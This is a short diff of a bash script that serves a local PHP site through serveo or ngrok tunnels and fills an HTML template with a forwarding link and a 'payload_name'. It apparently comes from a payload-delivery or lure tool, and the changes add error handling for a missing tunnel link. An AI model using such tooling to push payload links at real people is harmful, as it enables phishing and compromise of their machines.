@@ -175,6 +175,10 @@ fuser -k 3333/tcp > /dev/null 2>&1
 php -S localhost:3333 > /dev/null 2>&1 &
 sleep 3
 send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
+if [ -z $send_link ];then
+printf "\033[1;91m Error \n"
+server
+fi
 printf '\n\n\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n\n' $send_link
 
 }
@@ -201,7 +205,7 @@ sed 's+forwarding_link+'$link'+g' template.html | sed 's+payload_name+'$payload_
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 printf "\e[1;92m[\e[0m+\e[1;33m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
 if [ -z $link ];then
-printf "\n \033[91m Error "
+printf " \033[91m Error \n"
 ngrok_server
 fi
 }
